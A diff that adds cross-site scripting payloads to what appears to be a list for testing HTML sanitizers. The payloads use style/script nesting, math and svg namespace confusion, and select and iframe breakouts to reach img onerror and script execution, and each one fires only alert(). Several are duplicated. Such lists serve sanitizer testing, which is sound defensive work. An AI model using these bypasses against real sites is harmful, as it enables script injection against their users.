@@ -7,6 +7,53 @@
 
 <script>alert(123);</script>
 
+<style><script>alert(1)</script>
+<style></style><script>alert(1)</script></style>
+ 
+ <style><script>alert(1)</script>
+<style></style><script>alert(1)</script></style>
+
+<style></sty</stye>
+<style>le><script>alert(1)</script></style>
+
+<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+
+<style><style /><img src=x onerror=alert(1)> 
+
+<img alt="<x" title="/><img src=x onerror=alert(1)>">
+
+<option><style></option></select><img src=x onerror=alert(1)></style>
+
+<simg alt="<x" title="/><img src=x onerror=alert(1)>">
+
+<select multiple='multiple'><option><style></opion></select><img src=x onerror=alert(1)></style></select>
+
+<xmp><img src=x></xmp>
+	
+<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">
+	
+<math><iframe><!--</iframe><img src onerror=alert("XSS")>
+ 
+<style></sty</stye>
+<style>le><script>alert(1)</script></style>
+ 
+<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+ 
+<style><style /><img src=x onerror=alert(1)> 
+ 
+<img alt="<x" title="/><img src=x onerror=alert(1)>">
+ 
+<option><style></option></select><img src=x onerror=alert(1)></style>
+ 
+<simg alt="<x" title="/><img src=x onerror=alert(1)>">
+ 
+<select multiple='multiple'><option><style></opion></select><img src=x onerror=alert(1)></style></select>
+ 
+<xmp><img src=x></xmp>
+ 
+<iframe><textarea></iframe><img src="" onerror="alert(document.domain)">
+ 
+<math><iframe><!--</iframe><img src onerror=alert("XSS")>
 <ScRipT>alert("XSS");</ScRipT>
 
 <script>alert(123)</script>
